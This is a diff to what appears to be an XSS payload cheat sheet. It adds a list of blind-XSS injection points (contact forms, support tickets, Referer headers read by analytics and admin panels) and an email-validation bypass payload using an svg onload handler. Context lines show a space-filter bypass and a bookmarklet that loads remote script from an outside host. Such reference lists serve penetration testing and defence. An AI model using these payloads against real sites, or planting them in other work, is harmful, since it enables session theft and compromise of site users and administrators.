@@ -325,6 +325,14 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yoursu
 - [BlueLotus_XSSReceiver - FiresunCN](https://github.com/firesunCN/BlueLotus_XSSReceiver)
 - [ezXSS - ssl](https://github.com/ssl/ezXSS)
 
+### Blind XSS endpoint
+
+- Contact forms
+- Ticket support
+- Referer Header
+  - Custom Site Analytics
+  - Administrative Panel logs
+
 ## Polyglot XSS
 
 Polyglot XSS - 0xsobky
@@ -505,6 +513,12 @@ Bypass space filter with 0x0c/^L
 $ echo "<svg^Lonload^L=^Lalert(1)^L>" | xxd
 00000000: 3c73 7667 0c6f 6e6c 6f61 640c 3d0c 616c  <svg.onload.=.al
 00000010: 6572 7428 3129 0c3e 0a                   ert(1).>.
+```
+
+Bypass email filter ([RFC compliant](http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate))
+
+```javascript
+"><svg/onload=confirm(1)>"@x.y
 ```
 
 Bypass document blacklist
